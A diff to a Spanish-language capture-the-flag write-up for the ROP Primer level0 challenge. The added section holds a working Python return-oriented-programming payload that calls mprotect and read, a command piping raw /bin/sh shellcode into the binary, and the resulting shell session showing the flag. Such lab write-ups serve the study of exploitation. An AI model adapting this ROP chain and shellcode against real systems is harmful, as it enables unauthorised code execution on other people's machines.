@@ -761,7 +761,76 @@ Aquí hay que constar que antes lo intenté con otra cadena:
 ```
 vaddr=0x080ace48 paddr=0x00064e48 ordinal=133 sz=5 len=4 section=.rodata type=ascii string=apic
 ```
-Pero no funcionaba porque en la dirección de la cadena contiene el código 0a
+Pero no funcionaba porque en la dirección de la cadena contiene el código '0a'(LF-nueva línea) por lo que a la hora de cargar el payload creaba una nueva línea que impedía la ejecucción. Por eso cambié a processor que no contiene el valor '0a'.
+
+Solución buena y muy instructiva:
+
+Está perfectamente explicado aquí:
+https://xmgv.wordpress.com/2015/08/15/rop-primer-level-0/
+
+Se trata de utilizar la función mprotect para cambiar los permisos de un bloque de la memoria y hacer que sea ejecutable. Luego se llama a la función 'read' que va a leer el shellcode (/bin/sh) que le viene por pantalla y lo guarda en el bloque de memoria, previamente manipulado para que sea ejecutable. Por último se hace una llamada al comando cat para que ejecute el shellcode y se muestre por pantalla.
+
+Este es el python:
+
+```python
+#!/bin/env python
+
+import struct
+
+def p(x):
+    return struct.pack('<L', x)
+
+#GADGETS
+gad1 = 0x8048882
+
+#VALORES
+mprotect = 0x080523e0
+bloquemem = 0x080ca000
+sizemem = 0x1000
+flagmem = 0x7
+read = 0x80517f0
+
+# empty payload
+payload = ""
+
+# padding
+payload += "A" * 44
+#payload += "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+
+# mark memory as rwx
+payload += p(mprotect)
+payload += p(gad1)
+payload += p(bloquemem)    	# address
+payload += p(0x1000)        # size
+payload += p(0x7)           # PROT_READ| PROT_WRITE| PROT_EXEC
+
+# read shellcode from stdin
+payload += p(read)
+payload += p(bloquemem)		# Aqui vuelve despues de llamar a read para ejecutar lo que haya
+payload += p(0x0)           # fd = STDIN
+payload += p(bloquemem)    	# buf
+payload += p(0x100)         # nbyte
+
+print payload
+```
+Y aquí el comando que se ejecuta para explotar el binario:
+```
+(python ./bueno.py; python -c 'print "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"'; cat) | ./level0
+```
+```
+level0@rop:~$ (python ./bueno.py; python -c 'print "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"'; cat) | ./level0
+[+] ROP tutorial level0
+[+] What's your name? [+] Bet you can't ROP me, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA▒▒!
+xterm
+/bin/sh: 1: xterm: not found
+ls
+bueno.py  file  flag  getenv  getenv.c  handle_amd  handle_amd.c  level0  mio.py  otro.py  peda-session-level0.txt  proccesor  proccesor.c
+whoami
+level1
+cat flag
+flag{rop_the_night_away}
+```
+
 
 
 
